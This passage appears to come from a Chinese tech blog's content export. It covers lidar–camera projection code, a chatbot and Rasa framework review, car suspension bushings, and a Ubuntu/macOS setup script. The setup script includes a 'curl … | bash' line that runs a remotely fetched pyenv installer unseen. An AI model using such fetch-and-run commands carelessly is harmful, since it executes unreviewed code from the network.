<h3 id="PlaneRecover"><a href="#PlaneRecover" class="headerlink" title="PlaneRecover"></a>PlaneRecover</h3><p><img src="http://qiniu.s1nh.org/PlaneRecover-tab1.png" alt=""></p>
<p><img src="http://qiniu.s1nh.org/PlaneRecover-tab2.png" alt=""></p>
<h3 id="PlaneRCNN"><a href="#PlaneRCNN" class="headerlink" title="PlaneRCNN"></a>PlaneRCNN</h3><p><img src="http://qiniu.s1nh.org/PlaneRCNN-fig4.png" alt=""></p>
<h3 id="PlanarReconstruction"><a href="#PlanarReconstruction" class="headerlink" title="PlanarReconstruction"></a>PlanarReconstruction</h3><p><img src="http://qiniu.s1nh.org/PlanarReconstruction-fig4.png" alt=""></p>
<p><img src="http://qiniu.s1nh.org/PlanarReconstruction-tab1.png" alt=""></p>
<p><img src="http://qiniu.s1nh.org/PlanarReconstruction-tab2.png" alt=""></p>
<p><img src="http://qiniu.s1nh.org/PlanarReconstruction-tab3.png" alt=""></p>

]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
  </entry>
  <entry>
    <title>多线激光 Velodyne 与相机的配准及投影</title>
    <url>/post/project-velodyne/</url>
    <content><![CDATA[<h2 id="0x00-Velodyne-简介"><a href="#0x00-Velodyne-简介" class="headerlink" title="0x00 Velodyne 简介"></a>0x00 Velodyne 简介</h2><h3 id="1-数据结构及坐标系"><a href="#1-数据结构及坐标系" class="headerlink" title="1. 数据结构及坐标系"></a>1. 数据结构及坐标系</h3><p>Velodyne 通过网线发送的原始数据包为球坐标（spherical coordinates, r, ω, α）。它的 <a href="https://github.com/ros-drivers/velodyne">ros driver</a> 提供了两种更方便的格式：<code>/velodyne_points</code>和<code>/velodyne_scan</code></p>
<p>其中，<code>/velodyne_points</code>是转换为XYZ后的坐标，转换的方式如下图；<code>/velodyne_scan</code>为第8根线的scan值（可直接用来模拟单线雷达）。 </p>
<p><img src="http://qiniu.s1nh.org/project_velodyne_5.png-QNthin"></p>
<span id="more"></span>

<p><code>/velodyne_points</code>的数据结构为：</p>
<ul>
<li>point: 坐标（x,y）</li>
<li>intensity: 强度(0~255) 具体解释见下节（反射率）</li>
<li>ring: 第几根线(0~15)</li>
</ul>
<h3 id="2-反射率"><a href="#2-反射率" class="headerlink" title="2. 反射率"></a>2. 反射率</h3><p>Velodyne 测量 1m - 100m 物体的反射率（距离小于一米的点应该被忽略），其反射率的标定文件存储在VLP-16内置的FPGA中。当反射为漫反射（Diffuse Reflector）时，反射率的数值为0～100；当反射为<a href="https://baike.baidu.com/item/%E9%80%86%E5%8F%8D%E5%B0%84">逆反射</a>（Retro-Reflector）时，数值为101～255.</p>
<p><img src="http://qiniu.s1nh.org/project_velodyne_6.png-QNthin"></p>
<h3 id="3-反射模型"><a href="#3-反射模型" class="headerlink" title="3. 反射模型"></a>3. 反射模型</h3><p>Velodyne 单次激光可能撞击多个物体，产生多次返回值，VLP-16 可以记录最强反射和最后一次反射。如下图大部分光束撞击近壁，而光束的其余部分撞击远墙。只有当两个物体之间的距离大于1米时，VLP-16才会记录两个返回值，如果最强反射是最后一次反射，则报告<strong>次强</strong>反射值。</p>
<p><img src="http://qiniu.s1nh.org/project_velodyne_8.png-QNthin"></p>
<p>双返回功能通常用于林业应用，用户需要确定树木的高度。下图说明了当激光点撞击外部树叶，穿透树叶和树枝并最终撞击地面时返回的值。</p>
<p><img src="http://qiniu.s1nh.org/project_velodyne_7.png-QNthin"></p>
<p>在Velodyne的配置页面中可以选择反射模型： <code>Strongest</code>， <code>Last</code> 或 <code>Dual</code>.</p>
<p><img src="http://qiniu.s1nh.org/project_velodyne_9.png-QNthin"></p>
<h3 id="4-Velodyne-坐标系"><a href="#4-Velodyne-坐标系" class="headerlink" title="4. Velodyne 坐标系"></a>4. Velodyne 坐标系</h3><p>VLP-16 原始的返回值为球坐标（spherical coordinates, r, ω, α）。 在rosbag中，<code>/velodyne_points</code>是转换为XYZ后的坐标；<code>/velodyne_scan</code>为第8根线的scan值（可直接用来模拟单线雷达）。 坐标系如下图所示。</p>
<p><img src="http://qiniu.s1nh.org/project_velodyne_5.png-QNthin"></p>
<h3 id="5-相机坐标系"><a href="#5-相机坐标系" class="headerlink" title="5. 相机坐标系"></a>5. 相机坐标系</h3><p>考虑到需要对VLP-16与相机进行配准，需要了解相机的坐标系。（Z轴向前）</p>
<p><img src="http://qiniu.s1nh.org/project_velodyne_11.png-QNthin"></p>
<h2 id="0x01-标定"><a href="#0x01-标定" class="headerlink" title="0x01 标定"></a>0x01 标定</h2><p>标定可以参见这篇： <a href="post/calib-velodyne-camera/">多目相机、Velodyne标定那些破事</a></p>
<p>##0x02 将 Velodyne 的深度信息投影到 camera</p>
<p><strong>1. 首先，获取点云信息 topic:<code>/velodyne_points</code>。在下图中，绿圈为标定板</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; points_velo &#x3D; pointcloud2_to_xyz_array(msg).T   # np.array([X,Y,Z,1])</span><br><span class="line">&gt; points_velo.shape  # 一帧有22301个点，坐标为(x, y, z, 1)</span><br><span class="line">(4, 22301)</span><br></pre></td></tr></table></figure>

<p><img src="http://qiniu.s1nh.org/project_velodyne_1.png-QNthin"></p>
<p><strong>2. 将点云转换到相机坐标系，只保留相机前方的点（黄色为保留的点）</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">points_cam &#x3D; np.matmul(transf_mat, points_velo)</span><br><span class="line">points_cam_front &#x3D; points_cam.T[points_cam.T[:,2]&gt;0].T</span><br></pre></td></tr></table></figure>

<p><img src="http://qiniu.s1nh.org/project_velodyne_2.png-QNthin"></p>
<p><strong>3. 将空间坐标转换为图像上的坐标：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">points_img &#x3D; np.matmul(projection_matrix, points_cam_front)</span><br><span class="line">points_img[0:2,:] &#x2F;&#x3D; points_img[2,:]</span><br><span class="line">points_img &#x3D; np.array(points_img.T)</span><br></pre></td></tr></table></figure>

<p><img src="http://qiniu.s1nh.org/project_velodyne_4.png-QNthin"></p>
]]></content>
      <categories>
        <category>SLAM</category>
      </categories>
  </entry>
  <entry>
    <title>有关 Chatbot 基本原理、开源框架和 Rasa</title>
    <url>/post/review-of-chatbot-framework/</url>
    <content><![CDATA[<blockquote>
<p>阅读了几篇关于 Chatbot 的综述、文档，Rasa 的介绍。另外，调研了一些大厂的 Chatbot 框架，包括Google 的 <a href="https://cloud.google.com/dialogflow/pricing">Dialogflow</a>, <a href="https://dev.botframework.com/">Microsoft Bot</a>, <a href="https://aws.amazon.com/lex/pricing/">AWS LEX</a>, <a href="https://www.alixiaomi.com/">阿里小蜜</a>；和开源超过 1k stars 的框架，包括 <a href="https://rasa.com/">Rasa</a>, <a href="https://github.com/oyfml/opennlu">OpenNLU</a>, <a href="https://github.com/facebookresearch/ParlAI">ParlAI</a>, <a href="https://github.com/gunthercox/ChatterBot">ChatterBot</a>, <a href="https://github.com/alfredfrancis/ai-chatbot-framework">ai-chatbot-framework</a>。</p>
</blockquote>
<span id="more"></span>

<h2 id="0x01-聊天机器人"><a href="#0x01-聊天机器人" class="headerlink" title="0x01 聊天机器人"></a>0x01 聊天机器人</h2><h3 id="1-1-基于场景的分类"><a href="#1-1-基于场景的分类" class="headerlink" title="1.1 基于场景的分类"></a>1.1 基于场景的分类</h3><p>(<a href="https://link.springer.com/chapter/10.1007/978-3-030-49186-4_31">Eleni et al., 2020</a>) 简要的介绍了聊天机器人的基本概念，同时对两天机器人在不同场景下进行了分类：</p>
<ul>
<li><code>知识领域</code>: open domain, close domain;</li>
<li><code>提供服务</code>: interpersonal, inter-agent;</li>
<li><code>目标</code>: informative(FAQ), chat-based(conversational), Task-based;</li>
<li><code>输入处理和响应生成方法</code>: rule-based, retrieval-based, generative based; </li>
</ul>
<h3 id="1-2-基于计算方法的分类"><a href="#1-2-基于计算方法的分类" class="headerlink" title="1.2 基于计算方法的分类"></a>1.2 基于计算方法的分类</h3><p>(<a href="https://wires.onlinelibrary.wiley.com/doi/pdf/10.1002/widm.1434?casa_token=L_ycUq2CuG0AAAAA:yyz7TUFvn3zF5FRu7mJBmFyMY0jlPe4eNGvs8KoKzrrtMbgn2LSWcQzpxsgCLUdItmOzDzfNQyLOcViZJ8M">Luo Bei,2021</a>) 对SOTA 的 chatbot 做了一个详细的综述，其中包括<code>基于计算方法的分类</code> <code>Chatbot 市面上的应用</code> <code>知识库建立方法</code>：</p>
<ul>
<li>a. <code>基于模板的聊天机器人</code></li>
<li>b. <code>基于语料库的聊天机器人</code> </li>
<li>c. <code>基于意图的聊天机器人</code></li>
<li>d. <code>基于RNN的聊天机器人</code></li>
<li>e. <code>基于强化学习的聊天机器人</code></li>
<li>f. <code>采用混合方法的聊天机器人</code></li>
</ul>
<p><strong>a. 基于模式匹配（模板）的聊天机器人</strong></p>
<p>基于 AIML(人工智能标记语言)，匹配预定义的模板。LSA（潜在语义分析）使用单词之间的相似性作为向量表示，可与作为 AIML 的兜底，当 AIML 无法匹配到问题时，使用LSA进行回复。</p>
<p>此方法致命的缺陷是，不会存储历史对话，可能导致循环对话。</p>
<p><code>AIML 的一个例子</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;aiml&gt;</span><br><span class="line">  &lt;category&gt;</span><br><span class="line">    &lt;pattern&gt; My name is * and I am * years old &lt;&#x2F;pattern&gt;</span><br><span class="line">    &lt;template&gt; Hello &lt;star&#x2F;&gt;. I am also &lt;Star index&#x3D;&quot;2&quot;&#x2F;&gt; years old! &lt;&#x2F;template&gt;</span><br><span class="line">  &lt;&#x2F;category&gt;</span><br><span class="line">&lt;&#x2F;aiml&gt;</span><br></pre></td></tr></table></figure>

<p><strong>b. 基于意图识别的 Chatbot</strong></p>
<p>首先，自动语音识别模块将音频信息转换为文本，实现多媒体处理器的功能。接下来，口语理解 (SLU) 语义解析用户话语以检测用户查询的意图，从槽中提取某些信息，并形成语义框架。该模块与多模态输入分析并行。之后，DST 用于估计当前对话的状态，DPO 用于确定动作和响应；这两个组件都属于响应生成器。最后，输出适当的消息。</p>
<p><img src="http://qiniu.s1nh.org/blog_chatbot-pipeline.png" alt="基于意图的聊天机器人"></p>
<p><strong>c. Seq2Seq 模型的原理</strong><br><img src="http://qiniu.s1nh.org/blog_chatbot-seq2seq.png" alt="序列到序列（Seq2Seq）模型的计算机制"></p>
<p><strong>d. 强化学习的方法主要基于Markov决策过程，通常描述为</strong></p>
<blockquote>
<ol>
<li>有限状态集 $S={s_i}$；</li>
<li>有限的行动集 $A={a_i}$ 描述了从一个状态到另一个状态的变换；</li>
<li>策略 $a=π(s)$ 指定在状态下执行动作的概率 $s$；</li>
<li>状态转移模型 $T(s,a,s’)=P_r(s’|s,a)$ 表示从状态 $s$ 转移到下一个状态 $s’$ 的概率；</li>
<li>奖励函数 $R(s,a,s’)$ 指定某个状态转移后的即时奖励。</li>
</ol>
<p>通过上述定义，强化学习会找到一个最优策略，以最大化收益：<br>$Q_π(s,a)={max}_πE[r_t+γr_{t+1}+γ^2r_{t+2}+… \vee s_t=s, a_t=a,π]$</p>
</blockquote>
<p><strong>e. 基于各种计算方法的聊天机器人分类</strong></p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left">Template-based chatbot</th>
<th align="left">Corpus-based chatbot</th>
<th align="left">Intent-based chatbot</th>
<th align="left">RNN-based chatbot</th>
<th align="left">RL-based chatbot</th>
<th align="left">Chatbot with hybrid approaches</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Techniques of knowledge management</td>
<td align="left">AIML</td>
<td align="left">Database and ontology</td>
<td align="left">—</td>
<td align="left">—</td>
<td align="left">—</td>
<td align="left">Depends on components</td>
</tr>
<tr>
<td align="left">Techniques of response generation</td>
<td align="left">Pattern matching</td>
<td align="left">Text mining</td>
<td align="left">SLU, DST, DPO, NLG</td>
<td align="left">RNN and LSTM/GRU</td>
<td align="left">RL</td>
<td align="left">Ranking algorithm/embedded technology</td>
</tr>
<tr>
<td align="left">Typical chatbot</td>
<td align="left">ALICE (Abushawar &amp; Atwell, 2015)</td>
<td align="left">KRISTINA (Wanner et al., 2017)</td>
<td align="left">Dialogflow</td>
<td align="left">Shao et al. (2017)</td>
<td align="left">MILABOT (Serban et al. (2018)</td>
<td align="left">Song et al. (2016)</td>
</tr>
<tr>
<td align="left">Characteristics</td>
<td align="left">Simplicity</td>
<td align="left">Well-performed knowledge management</td>
<td align="left">Multi-turn responses</td>
<td align="left">Wide-range communication topics; uncertain responses</td>
<td align="left">Consideration of context</td>
<td align="left">More complicated, but better performance</td>
</tr>
<tr>
<td align="left">Suitable application</td>
<td align="left">Simple and task-oriented</td>
<td align="left">Applications that require large knowledge bases</td>
<td align="left">Multi-turn and task-oriented</td>
<td align="left">Open domain and chat-oriented</td>
<td align="left">Context-oriented</td>
<td align="left">Applications that require high performance with large investment</td>
</tr>
<tr>
<td align="left">Development direction</td>
<td align="left">Knowledge establishment and multimedia interaction</td>
<td align="left">Knowledge management and response matching</td>
<td align="left">User input understanding, dialogue state, and response generation</td>
<td align="left">Response generation and multimedia interaction</td>
<td align="left">Design for the appropriate application of RL chatbots</td>
<td align="left">Ranking algorithm improvement/embedding technology</td>
</tr>
</tbody></table>
<p><strong>f. 名词解释</strong></p>
<ul>
<li><code>AIML</code> 人工智能标记语言；</li>
<li><code>Chatscript</code> 一个 AIML 语言的继承者，可以储存长期记忆；</li>
<li><code>RiveScript</code> 一个纯文本的，用于开发聊天机器人和其他对话实体的基于行的脚本语言；</li>
<li><code>ALICE</code> 人工语言互联网计算机实体；</li>
<li><code>DPO</code> 对话策略优化；</li>
<li><code>DST</code> 对话状态跟踪；</li>
<li><code>GRU</code> 门控循环单元；</li>
<li><code>LSTM</code> 长短期记忆；</li>
<li><code>NLG</code> 自然语言生成；</li>
<li><code>RL</code> 强化学习；</li>
<li><code>RNN</code> 循环神经网络；</li>
<li><code>SLU</code> 口语理解；</li>
<li><code>NLP</code> 自然语言处理，是人工智能的一个领域，探索计算机对自然语言文本或语音的处理；</li>
<li><code>NLU</code> 自然语言理解，NLP 任务的核心。它是一种实现自然用户界面（例如聊天机器人）的技术。 NLU 旨在从自然语言用户输入中提取上下文和含义，这些输入可能是非结构化的，并根据用户意图做出适当的响应。它识别用户<strong>意图</strong>并提取特定的<strong>实体</strong>；</li>
<li><code>intent</code> 意图，表示用户所说的内容与聊天机器人应采取的操作之间的映射；</li>
<li><code>actions</code> 操作，对应于聊天机器人在用户输入触发特定意图时将采取的步骤，并且可能具有用于指定有关它的详细信息的参数。<strong>意图检测</strong>通常被表述为<strong>句子分类</strong>，其中为每个句子预测单个或多个意图标签；</li>
<li><code>entity</code> 实体，是一种从自然语言输入中提取参数值的工具。例如，考虑句子“希腊的天气如何？”。用户意图是学习天气预报。实体值为希腊。因此，用户要求希腊的天气预报。实体可以是系统定义的或开发者定义的。例如，系统实体 @sys.date 对应于标准日期引用，如 2019 年 8 月 10 日或 8 月 10 日。域实体提取通常被称为槽填充问题，被表述为一个顺序标记问题，其中提取句子的各个部分并用域实体标记；</li>
<li><code>contexts</code> 上下文，是存储用户所指或谈论的对象的上下文的字符串。例如，用户可能会在他的以下句子中引用先前定义的对象。用户可以输入“打开风扇”。这里要保存的上下文是风扇，这样当用户说“关闭它”作为下一个输入时，可以在<strong>上下文</strong>“风扇”上调用<strong>意图</strong>“关闭”。</li>
</ul>
<!--
### 1.3 搭建聊天机器人的重点

* 自然语言处理
* 知识库建立
* 生成回复
* 多模态交互

### 1.4 接下来的研究方向

1. 各种框架中知识库的结构不统一
2. 优化 response generation
3. 多模态的融合，手势、语调等
4. 更优秀的用户界面
5. 定制化（个性化服务）
6. 情感敏感的沟通
7. 平衡内容的收敛与发散
8. 可用性分析
-->


<!-- ![taxonomy_of_chatbots](uploads/2f24c456b9dc80ea32ba89f71c4a24c5/taxonomy_of_chatbots.png) -->



<h2 id="0x02-Rasa"><a href="#0x02-Rasa" class="headerlink" title="0x02 Rasa"></a>0x02 Rasa</h2><blockquote>
<p>区别与算法研究，搭建一个 Chatbot 更多的工作是构建知识库、意图、接口，搭建回归测试保证算法的鲁棒性等，选择一个流行的对话框架可以减少研究人员对工程代码的编写。<br>其中，谷歌、微软、亚马逊、阿里这几个大厂的 Chatbot 服务均需要收费。</p>
</blockquote>
<ul>
<li><a href="https://arxiv.org/abs/1712.05181">Bocklisch et al. 2017, Rasa: Open Source Language Understanding and Dialogue Management </a> 介绍了 rasa 的功能和先进性；</li>
<li><a href="http://qiniu.s1nh.org/blog_Conversational-AI-with-Rasa.pdf">Hu Xiaoquan et al. 2021, Conversational AI with Rasa[M]</a>详细的介绍了 rasa 的使用方法。</li>
</ul>
<h3 id="2-1-架构"><a href="#2-1-架构" class="headerlink" title="2.1 架构"></a>2.1 架构</h3><ol>
<li>收到消息并传递给解释器（例如RASA NLU）以提取意图，实体和任何其他结构化信息。 </li>
<li>跟踪器维护会话状态。它收到已收到新消息的通知。 </li>
<li>策略接收跟踪器的当前状态。 </li>
<li>策略选择接下来的行动。 </li>
<li>所选操作由跟踪器记录。 </li>
<li>执行该操作（这可以包括向用户发送消息）。 </li>
<li>如果预测的行动不是’听’，请返回步骤3</li>
</ol>
<p><img src="http://qiniu.s1nh.org/blog_chatbot-rasa-pipeline.png" alt="架构"></p>
<h3 id="2-2-动作（Actions）"><a href="#2-2-动作（Actions）" class="headerlink" title="2.2 动作（Actions）"></a>2.2 动作（Actions）</h3><p>简单的对话, 或任意函数，包含对话中的历史信息。</p>
<h3 id="2-3-松耦合的-NLU-模块"><a href="#2-3-松耦合的-NLU-模块" class="headerlink" title="2.3 松耦合的 NLU 模块"></a>2.3 松耦合的 NLU 模块</h3><p>比如 spacy_sklearn, spaCy, GloVe, ner_crf.</p>
<h3 id="2-4-策略"><a href="#2-4-策略" class="headerlink" title="2.4 策略"></a>2.4 策略</h3><p>通过以下特征定义下一步action：</p>
<ul>
<li>最后一个动作是什么</li>
<li>最近用户消息中的意图和实体</li>
<li>当前定义了哪些槽</li>
</ul>
<h3 id="2-5-方便阅读的训练数据格式-json"><a href="#2-5-方便阅读的训练数据格式-json" class="headerlink" title="2.5 方便阅读的训练数据格式, json"></a>2.5 方便阅读的训练数据格式, json</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;text&quot;: &quot;show me chinese restaurants&quot;,</span><br><span class="line">  &quot;intent&quot;: &quot;restaurant_search&quot;,</span><br><span class="line">  &quot;entities&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;start&quot;: 8,</span><br><span class="line">      &quot;end&quot;: 15,</span><br><span class="line">      &quot;value&quot;: &quot;chinese&quot;,</span><br><span class="line">      &quot;entity&quot;: &quot;cuisine&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-6-machine-teaching-for-supervised-learning"><a href="#2-6-machine-teaching-for-supervised-learning" class="headerlink" title="2.6 machine teaching for supervised learning"></a>2.6 machine teaching for supervised learning</h3><p>提供可能的动作和概率，生成新的训练数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">what is the next action for the bot?</span><br><span class="line">	0 	action_listen 			0.12</span><br><span class="line">			...</span><br><span class="line">	8 	utter_ask_cuisine 		0.03</span><br><span class="line">	9 	utter_ask_helpmore 		0.03	</span><br><span class="line">	10 	utter_ask_howcanhelp 		0.19</span><br><span class="line">	11 	utter_ask_location 		0.04</span><br><span class="line">	12 	utter_ask_moreupdates 		0.03</span><br><span class="line">	13 	utter_ask_numpeople 		0.05</span><br><span class="line">	14 	action_search_restaurants 	0.03</span><br></pre></td></tr></table></figure>

<h3 id="2-7-对话图的可视化"><a href="#2-7-对话图的可视化" class="headerlink" title="2.7 对话图的可视化"></a>2.7 对话图的可视化</h3><p><img src="http://qiniu.s1nh.org/blog_chatbot-rasa-graph.png" alt="对话图的可视化"></p>
<h3 id="2-8-在生产环境中部署"><a href="#2-8-在生产环境中部署" class="headerlink" title="2.8 在生产环境中部署"></a>2.8 在生产环境中部署</h3><p>支持 docker，线程/进程并行的 HTTP API.</p>
<h3 id="2-9-支持的数据"><a href="#2-9-支持的数据" class="headerlink" title="2.9 支持的数据"></a>2.9 支持的数据</h3><p>支持的数据包括由按意图分类的用户话语组成的 NLU 数据，其中还可以包括实体、正则表达式和查找表等额外信息；此外还可以包含 <code>story base</code> 和 <code>rule base</code> 的对话数据，如下。其它的例子参见 <a href="https://rasa.com/docs/rasa/training-data-format/">RASA: Training Data Format</a>：</p>
<p><strong>a. Entities</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nlu:</span><br><span class="line">- intent: check_balance</span><br><span class="line">  examples: |</span><br><span class="line">    - What&#39;s my [credit](account) balance?</span><br><span class="line">    - What&#39;s the balance on my [credit card account]&#123;&quot;entity&quot;:&quot;account&quot;,&quot;value&quot;:&quot;credit&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>b. Synonyms</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nlu:</span><br><span class="line">- synonym: credit</span><br><span class="line">  examples: |</span><br><span class="line">    - credit card account</span><br><span class="line">    - credit account</span><br></pre></td></tr></table></figure>

<p><strong>c. Rules</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rules:</span><br><span class="line">- rule: Only say &#96;hey&#96; when the user provided a name</span><br><span class="line">  condition:</span><br><span class="line">  - slot_was_set:</span><br><span class="line">    - user_provided_name: true</span><br><span class="line">  steps:</span><br><span class="line">  - intent: greet</span><br><span class="line">  - action: utter_greet</span><br></pre></td></tr></table></figure>

<p>(To be continued…)</p>
<h2 id="0xFF-其它有用的资料："><a href="#0xFF-其它有用的资料：" class="headerlink" title="0xFF 其它有用的资料："></a>0xFF 其它有用的资料：</h2><ul>
<li><a href="uploads/8ef381b0acd4ed2832d709879be277e1/Conversational+AI+with+Rasa.pdf">Conversational AI with Rasa.pdf</a></li>
<li><a href="https://github.com/fighting41love/funNLP">NLP民工的乐园: 几乎最全的中文NLP资源库</a></li>
<li><a href="https://github.com/fendouai/Awesome-Chatbot">Awesome-Chatbot</a></li>
<li><a href="https://github.com/codemayq/chinese_chatbot_corpus">中文公开聊天语料库</a></li>
<li><a href="https://github.com/zhaoyingjun/chatbot">zhaoyingjun/chatbot</a></li>
<li><a href="https://github.com/codemayq/chinese_chatbot_corpus">开闲聊常用语料和短信</a></li>
<li><a href="https://www.jianshu.com/p/43e8f9e4a335">如何打造你自己的聊天机器人</a></li>
<li><a href="https://wechaty.js.org/docs/wechaty"><code>wechaty</code></a>: 一个可以把微信/京东客服等变成聊天机器人的工具，让运营人员更多的时间思考如何进行活动策划、留存用户，商业变现</li>
</ul>
]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>NLP</tag>
        <tag>Rasa</tag>
      </tags>
  </entry>
  <entry>
    <title>是否需要升级强化底盘胶套（机脚/摆臂/连杆）？</title>
    <url>/post/rubber-engine-mounts-vs-polyurethane-engine-mounts/</url>
    <content><![CDATA[<p><img src="http://qiniu.s1nh.org/blog_suspension_2.jpg-QNthin"></p>
<blockquote>
<p>机脚（发动机支架）负责在车架上固定和稳定发动机。为了减少发动机产生的振动，包含一个弹性的缓冲胶（机脚胶），给驾驶员创造一个更平稳，更愉快的旅程。另外，底座在发动机和车身之间起到弹簧的作用，减少了发动机的磨损。此外，发动机的噪音也会降低。随着发动机支座的磨损，通过车辆感觉到的振动量将开始增加。</p>
</blockquote>
<p>原厂机脚和底盘摆臂链接件通常是橡胶材料，某些厂家为赛车提供了聚氨酯材料的缓冲胶。橡胶和聚氨酯由于其优异的可逆弹性变形性能和良好的阻尼和能量吸收特性，在许多汽车应用中得到应用。这两种类型的支架各有优缺点，我们将在下面讨论。</p>
<span id="more"></span>


<h2 id="两者的优缺点"><a href="#两者的优缺点" class="headerlink" title="两者的优缺点"></a>两者的优缺点</h2><p><strong>橡胶发动机支座–优点</strong></p>
<ul>
<li>降低道路噪音</li>
<li>阻尼振动</li>
<li>减弱了刺耳感</li>
<li>没有吱吱作响的机会</li>
<li>成本更低</li>
<li>更好的耐热性</li>
</ul>
<p><strong>橡胶发动机支座-缺点</strong></p>
<ul>
<li>标准寿命</li>
<li>典型的道路感觉</li>
<li>标准性能</li>
</ul>
<p>橡胶作为弹簧材料的声誉源于它能够保持寿命、弹性、与金属的结合、耐高温，同时保持低成本。与聚氨酯相比，橡胶的一个显著优点是其耐热性。如果应用包括显著的耐热性，那么橡胶是应该使用的弹性体。在水下也能抗肿胀。工业橡胶发动机支架将提供最大的振动和噪音抑制效果。然而，橡胶式支座也有一些缺点。这种类型的支架可能会过早开裂和撕裂，这取决于添加到橡胶化合物中的臭氧量。这可能会导致发动机在较大负载下过度移动，这反过来意味着从发动机通过动力传动系统传递到后轮的动力减少。</p>
<p><strong>聚氨酯发动机支架–优点</strong></p>
<ul>
<li>聚氨酯比橡胶耐用</li>
<li>增强了路感</li>
<li>性能增强</li>
</ul>
<p><strong>聚氨酯发动机支座-缺点</strong></p>
<ul>
<li>道路噪音增加</li>
<li>振动增加</li>
<li>成本更高</li>
<li>存在轻微的吱吱声机会</li>
<li>耐热性较低</li>
</ul>
<p>聚氨酯发动机支架在橡胶支架和钢制固体支架之间提供了一种折中方案。与橡胶相比，聚氨酯可以用于更高硬度的复合材料，这将比橡胶在更软硬度的复合材料更好地保持发动机的位置。使用较硬的材料时，更多的能量将通过传动系统传输。而聚氨酯由于其刚度增加，会增加驾驶员的振动感。有些振动可能取决于发动机的大小，无论是工业卡车、汽车、船、ATV还是其他类型的车辆。与许多事情一样，驾驶员对振动的一些容忍度可能归结为个人喜好。不过，总的来说，聚氨酯将比橡胶更硬，这使其成为更高级改装车辆的理想选择。</p>
<p><strong>两者应用在摆臂/连杆的区别</strong></p>
<!--![](http://qiniu.s1nh.org/blog_suspension_1.jpg-QNthin)-->

<ul>
<li>两者最大的不同是橡胶作用在摆臂（连杆）中需要扭转的部分时，为软连接，安装摆臂时需要用大剪在轮胎落地后才可以拧紧螺丝。具体方法可以参考<a href="https://club.autohome.com.cn/bbs/thread/a970415ad11d3808/82234492-1.html">这篇文章</a> <a href="http://qiniu.s1nh.org/blog_technology_sharing-zero_stress_treatment_of_suspension_arm_rubber_sleeve.pdf">PDF</a></li>
<li>聚氨酯胶套在这种情况下起到一个轴承的作用，并且需要在接触面涂抹润滑液，一定周期需要拆下重新涂抹润滑液，否则会出现摩擦异响，有关润滑液的选择可以参考<a href="https://www.suspension.com/blog/the-best-grease-for-polyurethane-bushings/">这篇文章</a></li>
<li>两者的区别可以参考<a href="https://haokan.baidu.com/v?pd=wisenatural&vid=7565273523948072663">这个视频</a></li>
</ul>
]]></content>
      <categories>
        <category>赛车</category>
      </categories>
      <tags>
        <tag>底盘强化</tag>
      </tags>
  </entry>
  <entry>
    <title>配置一台新电脑</title>
    <url>/post/set-up-a-new-computer/</url>
    <content><![CDATA[<p>本文整理了在安装完Ubuntu和OS X后需要的基本配置。</p>
<span id="more"></span>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## 安装 NPM</span><br><span class="line">sudo apt-get install npm</span><br><span class="line">npm set registry https:&#x2F;&#x2F;registry.npm.taobao.org # 注册模块镜像</span><br><span class="line">npm set disturl https:&#x2F;&#x2F;npm.taobao.org&#x2F;dist # node-gyp 编译依赖的 node 源码镜像</span><br><span class="line">npm cache clean # 清空缓存</span><br><span class="line"></span><br><span class="line">## 修改pip源</span><br><span class="line">cat &lt;&lt; EOF &gt; ~&#x2F;.pip&#x2F;pip.conf</span><br><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">## 安装pyenv</span><br><span class="line">curl -L https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;yyuu&#x2F;pyenv-installer&#x2F;master&#x2F;bin&#x2F;pyenv-installer | bash </span><br><span class="line"></span><br><span class="line">## 安装anaconda</span><br><span class="line"></span><br><span class="line">pyenv install --list # 显示可用 python 版本</span><br><span class="line">pyenv install anaconda3-4.3.0 # 安装 anaconda 3 （这一步下载安装包时特别慢，请按照下面的方法提前下载好安装包放到cache目录里）</span><br><span class="line"></span><br><span class="line"># 访问&#96;https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;archive&#x2F;&#96;下载安装包</span><br><span class="line"># 复制安装包到&#96;~&#x2F;.pyenv&#x2F;cache&#96;中，执行&#96;pyenv install&#96;安装。如果安装失败请参照[pyenv ~&#x2F;.pyenv&#x2F;cache 不生效问题](http:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;f3190b697e8d)</span><br><span class="line"></span><br><span class="line">## 修改conda源</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;conda-forge&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;msys2&#x2F;</span><br><span class="line">conda config --add channels 